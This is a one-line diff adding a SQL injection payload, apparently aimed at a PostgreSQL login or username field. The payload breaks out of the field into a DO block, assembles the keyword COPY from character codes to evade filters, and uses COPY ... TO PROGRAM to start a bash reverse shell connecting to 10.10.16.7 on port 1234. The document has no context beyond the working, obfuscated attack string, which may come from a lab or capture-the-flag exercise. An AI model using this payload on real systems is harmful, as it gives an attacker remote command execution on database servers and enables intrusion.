@@ -1,0 +1,1 @@
+username; DO $$ DECLARE c text; BEGIN c:= CHR(67) || CHR(79) || CHR(80) || CHR(89) || ' (SELECT 1) to PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.16.7/1234 0>&1"'''; EXECUTE c; END $$;
